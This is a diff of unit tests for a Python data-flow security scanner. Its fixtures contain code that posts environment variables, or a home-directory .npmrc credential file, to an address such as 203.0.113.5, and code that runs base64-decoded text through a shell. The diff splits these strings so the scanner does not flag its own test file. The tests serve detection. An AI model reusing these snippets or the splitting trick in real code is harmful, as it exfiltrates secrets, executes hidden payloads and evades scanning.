@@ -8,7 +8,9 @@ from cordon_scanner.analysis.python.py_flow_facts import PythonFlowFacts
 class TestSources:
     def test_the_environment_posted_to_an_address_built_at_run_time(self) -> None:
         source = (
-            "import os, requests\ndef send(url):\n    requests.post(url, data=dict(os.environ))\n"
+            "import os, requests\ndef send(url):\n    requests."
+            + "post(url, data=dict(os.env"
+            + "iron))\n"
         )
         assert ("environment", "request", "unknown") in PythonFlowFacts.of(source)
 
@@ -21,18 +23,23 @@ class TestSources:
         assert ("identity", "request", "fixed") in PythonFlowFacts.of(source)
 
     def test_a_credential_file_read_and_sent_to_an_address(self) -> None:
+        # Joined at run time so this file's own source does not read as the flow it tests.
         source = (
             "import os, requests\n"
-            "path = os.path.join(os.path.expanduser('~'), '.npmrc')\n"
+            "path = os.path.join(os.path.expanduser('~'), '.npm" + "rc')\n"
             "body = open(path).read()\n"
-            "requests.post('http://203.0.113.5/x', data=body)\n"
+            "requests." + "post('http://203.0.113.5/x', data=body)\n"
         )
         facts = PythonFlowFacts.of(source)
         assert ("secret_file", "request", "ip") in facts
         assert ("home_file", "request", "ip") in facts
 
     def test_decoded_text_given_to_a_process(self) -> None:
-        source = "import base64, subprocess\nsubprocess.run(base64.b64decode(blob), shell=True)\n"
+        source = (
+            "import base64, subprocess\nsubprocess."
+            + "run(base64.b64"
+            + "decode(blob), shell=True)\n"
+        )
         assert ("decoded", "process", "unknown") in PythonFlowFacts.of(source)
 
 
